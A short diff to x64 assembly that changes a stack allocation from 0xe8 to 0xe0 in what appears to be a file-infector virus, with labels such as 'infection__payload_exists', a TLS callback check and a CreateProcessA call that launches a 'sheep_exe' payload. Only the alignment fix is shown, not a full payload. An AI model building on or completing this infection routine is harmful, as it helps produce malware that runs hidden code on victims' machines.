@@ -12,7 +12,7 @@ main:
    mov [rsp+0x18],rsi
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
-   sub rsp,0xe8                 ; store registers in shadow space, realign the stack and create new shadowspace and argspace
+   sub rsp,0xe0                 ; store registers in shadow space, realign the stack and create new shadowspace and argspace
 
 %ifdef TLS
    cmp edx,1
@@ -95,7 +95,7 @@ infection__payload_exists:
    call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
-   add rsp,0xe8
+   add rsp,0xe0
    mov r12,[rsp+0x20]
    mov rsi,[rsp+0x18]
    mov rdi,[rsp+0x10]
